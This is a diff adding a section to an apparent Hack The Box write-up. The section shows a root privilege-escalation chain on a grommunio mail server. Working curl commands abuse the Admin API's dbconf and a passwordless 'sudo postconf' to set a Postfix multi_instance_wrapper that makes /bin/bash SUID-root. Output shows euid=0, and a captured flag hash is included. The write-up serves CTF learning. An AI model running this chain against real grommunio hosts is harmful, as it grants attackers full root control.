@@ -995,6 +995,126 @@ Resetting a hash is only useful in the database the Admin API actually reads. Th
 
 - An authenticated grommunio Admin API session as `admin` (`JWT` + `CSRF`), i.e. full control of the management plane.
 - The Admin API's documented capabilities (centralised config management via `dbconf`, and service start/stop/restart) are now available, which is exactly what Stage 4 turns into root.
+
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 5.4 Stage 4: Weaponise the Postfix multi-instance wrapper for root
+
+The Admin API can write service config (`dbconf`) and restart services. Postfix turns that combination into root.
+
+##### Theory: Postfix multi-instance wrapper
+
+Postfix supports running several mail instances on one host. When `multi_instance_enable = yes` and `multi_instance_directories` is non-empty, the `postfix(1)` control program no longer manages the mail system directly; for instance-aware actions (start, stop, reload, restart) it executes the command named in `multi_instance_wrapper` (normally `postmulti`), and it does so with root privileges during service start/restart. So if an attacker can (a) write `multi_instance_wrapper` into `main.cf` and (b) trigger a postfix start/restart, root executes an attacker-chosen command. The payload here is `chmod 4755 /bin/bash`, which leaves a SUID-root bash.
+
+The two capabilities exist: `main.cf` is writable via the Admin API `dbconf`, and services are restartable via the Admin API dashboard. The work is in making `dbconf` actually render to `/etc/postfix/main.cf`.
+
+#### 5.4.1 Dead end: dbconf PUT stores but does not render
+
+The first attempt set the four keys with a plain REST `PUT` and then restarted postfix:
+
+```bash
+curl -sk --cookie "grommunioAuthJwt=$JWT" -H "X-CSRF-TOKEN: $CSRF" \
+  -X PUT 'http://[::1]:8080/api/v1/system/dbconf/postfix/main.cf/' \
+  -H 'Content-Type: application/json' \
+  -d '{"data":{"multi_instance_enable":"yes","multi_instance_directories":"/etc/postfix","daemon_directory":"/usr/lib/postfix/bin","multi_instance_wrapper":"/usr/bin/chmod 4755 /bin/bash"}}'
+# then POST .../dashboard/services/postfix.service/restart  -> {"message":"Success"}
+
+grep -iE 'multi_instance' /etc/postfix/main.cf     # <-- empty: keys never reached the file
+ls -l /usr/bin/bash                                 # <-- still -rwxr-xr-x, no SUID
+```
+
+The restart reported success but `/etc/postfix/main.cf` had none of the keys, and bash was untouched. Root cause, established by enumeration:
+
+- The Admin API runs as the **non-root** `grommunio` user (`uwsgi`), so it cannot write the root-owned `/etc/postfix/main.cf` itself.
+- `dbconf` `PUT` only *stores* the values (confirmed in the `configs` table); applying them to the real file is a separate *commit* step that this call did not carry out.
+
+Trying the same via the `grommunio-admin dbconf` CLI passthrough (`/api/v1/system/cli`) returned `code:0` but also rendered nothing, so the gap was the commit, not the transport.
+
+#### 5.4.2 Understanding the commit mechanism
+
+The `dbconf` commit model is defined in `/usr/share/grommunio-admin-api/tools/dbconf.py`. Two facts decide the exploit:
+
+- The allowed file-commit command (from `GET /api/v1/system/dbconf/commands`) is `sudo postconf -e $FILE_S && systemctl reload postfix`. The `grommunio` user has a passwordless sudo right for `postconf`, so this command writes `main.cf` **as root**.
+- `commit()` only runs a command if there are rows under the meta-service `grommunio-dbconf` with `file = <service>` and keys `commit_*`. None existed for postfix, so every earlier commit was a silent no-op (the function returns early).
+- In `subVars`, each entry is passed through `shlex.quote`, so `multi_instance_wrapper=/usr/bin/chmod 4755 /bin/bash` is preserved as a single argument and the spaces do not break `postconf`.
+
+So the fix is to define a `commit_file` for postfix, then re-upload `main.cf` to trigger it.
+
+#### 5.4.3 The working chain to root
+
+```bash
+# 1) define the file-commit for the postfix service (under the grommunio-dbconf meta service)
+curl -sk --cookie "grommunioAuthJwt=$JWT" -H "X-CSRF-TOKEN: $CSRF" \
+  -X PUT 'http://[::1]:8080/api/v1/system/dbconf/grommunio-dbconf/postfix/' \
+  -H 'Content-Type: application/json' -d '{"data":{"commit_file":"#POSTCONF"}}'
+
+# 2) re-PUT main.cf -> commit() now runs _commitFile -> "sudo postconf -e <entries>" as ROOT
+curl -sk --cookie "grommunioAuthJwt=$JWT" -H "X-CSRF-TOKEN: $CSRF" \
+  -X PUT 'http://[::1]:8080/api/v1/system/dbconf/postfix/main.cf/' \
+  -H 'Content-Type: application/json' \
+  -d '{"data":{"multi_instance_enable":"yes","multi_instance_directories":"/etc/postfix","daemon_directory":"/usr/lib/postfix/bin","multi_instance_wrapper":"/usr/bin/chmod 4755 /bin/bash"}}'
+
+# 3) confirm root wrote the keys into the real file
+grep -iE 'multi_instance' /etc/postfix/main.cf
+
+# 4) fire the wrapper via the privileged restart endpoint
+curl -sk --cookie "grommunioAuthJwt=$JWT" -H "X-CSRF-TOKEN: $CSRF" \
+  -X POST 'http://[::1]:8080/api/v1/system/dashboard/services/postfix.service/restart' \
+  -H 'Content-Type: application/json' -d '{}'
+
+# 5) SUID bash -> root
+ls -l /usr/bin/bash
+/usr/bin/bash -p -c 'id; cat /root/user.txt'
+```
+
+**Result:**
+
+```text
+# step 2 response
+{"message":"Configuration updated but commit failed (Command exited with status code 256)"}
+
+# step 3: the keys are now in the real file (written by root via sudo postconf)
+multi_instance_wrapper = /usr/bin/chmod 4755 /bin/bash
+multi_instance_enable = yes
+multi_instance_directories = /etc/postfix
+
+# step 5
+-rwsr-xr-x 1 root root 1012656 Oct 13  2025 /usr/bin/bash
+uid=462(grofiles) gid=462(grofiles) euid=0(root) groups=462(grofiles)
+```
+
+The `commit failed (status 256)` is expected and harmless: the commit is `sudo postconf -e $FILE_S && systemctl reload postfix`. The `sudo postconf` ran as root and wrote `main.cf`; only the trailing `systemctl reload postfix` failed because it runs as the non-root `grommunio` user. The privileged dashboard restart (step 4) then started postfix in multi-instance mode, which executed `multi_instance_wrapper` (`chmod 4755 /bin/bash`) as root, setting the SUID bit.
+
+**What this gives you:**
+
+- SUID-root `/bin/bash`; `/usr/bin/bash -p` yields `euid=0(root)`, i.e. full root on the Linux host.
+- For a stable root shell: `/usr/bin/bash -p` and work from there.
+
+#### 5.4.4 Rabbit holes recorded
+
+- Style B `dbconf` PUT alone (no commit definition) stores but never renders; the restart then runs stock postfix and the wrapper never fires. This is the "postfix restarted but wrapper never ran" trap.
+- Omitting `multi_instance_enable=yes`, a non-empty `multi_instance_directories`, or a valid `daemon_directory` leaves the multi-instance code path un-entered, so the wrapper is never invoked even when `main.cf` is written.
+- Calling the restart from a browser produces endless 404s; the API is localhost-only and needs the JWT + CSRF from a shell on the box.
+
+### 5.5 User flag
+
+With root on the Linux host, read the user flag:
+
+```bash
+/usr/bin/bash -p -c 'cat /root/user.txt'
+```
+
+> **USER FLAG:** `ec96a1cbc119bfd8161c1c27b8ccfa9f`
+
+> Flag geography: on Autopilot, `user.txt` lives in `/root/` on the Linux grommunio host (HTB syncs flag files from DC01 to the Linux box). If a freshly read flag is ever rejected, it can be a release-day respawn artefact; re-read the file after the box repopulates.
+
 <div align="center">
 <br>
 <br>
